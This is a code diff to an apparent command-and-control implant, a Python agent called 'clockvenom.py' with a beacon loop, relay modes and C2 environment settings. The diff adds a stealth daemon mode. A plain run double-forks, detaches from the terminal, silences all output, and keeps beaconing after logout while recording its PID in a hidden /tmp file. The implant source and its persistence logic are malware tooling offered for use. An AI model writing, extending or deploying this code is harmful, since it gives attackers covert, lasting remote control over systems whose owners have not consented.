@@ -90,6 +90,15 @@ Relay mode (C2_RELAY_PORT):
   also be set (env or baked). Isolated agent config: WORKER_URL=http://<relay>:<port>.
   Both relay and isolated agent must share the same PSK. Runs in a daemon thread.
 
+Daemon mode (default):
+  A plain `python3 clockvenom.py` returns immediately: the beacon loop continues
+  in a detached daemon (double-fork: fork → setsid → fork) immune to SIGHUP on
+  shell logout/disconnect; stdio is redirected to /dev/null and the PID is
+  written to /tmp/.clockvenom.pid (auto-cleaned by /module suicide).
+  Flags:  --id          print the agent id and exit
+          --stop        SIGTERM the running daemon via the pidfile
+          --foreground  (-f) stay attached, no daemonization (debugging)
+
 Dependencies: Python 3.6+ stdlib only.
 
 Limitations:
@@ -120,6 +129,7 @@ TCP_PORT         = int(os.environ.get("C2_TCP_PORT",       "443"))
 C2_DIRECT        = os.environ.get("C2_DIRECT",             "")
 NTP_RELAY_PORT   = int(os.environ.get("C2_NTP_RELAY_PORT", "0"))
 NTP_RELAY_TARGET = os.environ.get("C2_NTP_RELAY_TARGET",   "")
+PIDFILE          = "/tmp/.clockvenom.pid"
 MAX_OUTPUT = 900
 
 _C2_IP           = ""
@@ -667,11 +677,55 @@ def _start_ntp_relay():
     threading.Thread(target=srv.serve_forever, daemon=True).start()
 
 
+def _daemonize():
+    if not hasattr(os, "fork"):
+        return
+    pid = os.fork()
+    if pid > 0:
+        sys.exit(0)
+    os.setsid()
+    if os.fork() > 0:
+        os._exit(0)
+    devnull = os.open(os.devnull, os.O_RDWR)
+    for fd in (0, 1, 2):
+        os.dup2(devnull, fd)
+    try:
+        with open(PIDFILE, "w") as f:
+            f.write(str(os.getpid()))
+    except OSError:
+        pass
+
+
+def _daemon_stop():
+    try:
+        with open(PIDFILE) as f:
+            pid = int(f.read().strip())
+        os.kill(pid, 15)
+        print(f"[daemon stopped : {pid}]")
+    except FileNotFoundError:
+        print("[no daemon]")
+        return
+    except ProcessLookupError:
+        print("[stale pidfile]")
+    except Exception as e:
+        print(f"[stop failed : {e}]")
+        return
+    try:
+        os.unlink(PIDFILE)
+    except OSError:
+        pass
+
+
 def main():
     global _C2_IP
     if len(sys.argv) > 1 and sys.argv[1] == "--id":
         print(AGENT_ID)
         return
+    if len(sys.argv) > 1 and sys.argv[1] == "--stop":
+        _daemon_stop()
+        return
+    if not any(a in ("-f", "--foreground") for a in sys.argv[1:]):
+        _daemonize()
     if RELAY_PORT:
         _start_relay()
     if NTP_RELAY_PORT and NTP_RELAY_TARGET:
